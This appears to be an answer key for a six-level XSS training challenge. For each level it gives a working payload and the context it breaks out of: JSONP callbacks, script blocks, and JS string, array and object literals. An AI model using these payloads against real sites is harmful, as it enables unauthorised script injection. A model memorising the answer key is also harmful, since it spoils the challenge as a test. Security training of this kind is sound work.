# json-xss — solutions

JSON-context reflections: JSONP callbacks, embedded JSON in script blocks, and DOM sinks.

### json-xss-level1

`/json/level1/?query=a&callback=alert(1);//`

- payload: `alert(1);//`
- context: callback param reflected into application/javascript response

### json-xss-level2

`/json/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: rendered to a JSON value but Content-Type sniffed if loaded as HTML; raw `<div>...</div>` wrapper

### json-xss-level3

`/json/level3/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: JSON string, only `\` and `"` escaped; angles pass through

### json-xss-level4

`/json/level4/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: inside JS string literal in inline `<script>`

### json-xss-level5

`/json/level5/?query=%22%5D;alert(1);//`

- payload: `"];alert(1);//`
- context: inside JS array string literal, document.write loop

### json-xss-level6

`/json/level6/?query=%22%7D%7D;alert(1);//`

- payload: `"}};alert(1);//`
- context: nested JSON string in inline script
